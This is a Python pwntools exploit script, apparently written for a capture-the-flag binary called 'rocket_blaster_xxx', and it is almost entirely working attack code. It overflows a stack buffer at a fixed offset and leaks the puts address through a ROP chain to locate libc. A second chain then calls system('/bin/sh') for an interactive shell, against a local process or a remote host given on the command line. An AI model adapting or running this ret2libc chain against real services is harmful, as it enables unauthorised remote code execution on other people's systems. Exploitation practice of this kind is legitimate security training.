from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./rocket_blaster_xxx"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *main+136
'''
def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def exploit():
    offset = 40
    log.info("binary loaded")
    pp.recvuntil(b">>")
    pop_rdi = 0x000000000040159f
    payload = flat(
        cyclic (offset),
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        elf.sym.main
            )
    pp.sendline(payload)
    pp.recvuntil(b"testing..\n")
    addr = pp.recvline().rstrip()
    libc.address = u64(addr +  (b"\x00" * (8 - len(addr)))) - libc.sym.puts
    log.info(f"/bin sh {hex(next(libc.search(b'/bin/sh')))} libcbase {hex(libc.address)}")
    ret = 0x000000000040101a
    payload = flat(
        cyclic(offset),
        pop_rdi,
        next(libc.search(b"/bin/sh\0")),
        ret,
        libc.sym.system,
            )
    pp.sendline(payload)
    pp.interactive()

if (args.REMOTE):
    libc = ELF("./glibc/libc.so.6")
else:
    libc = ELF("./glibc/libc.so.6")
    # libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
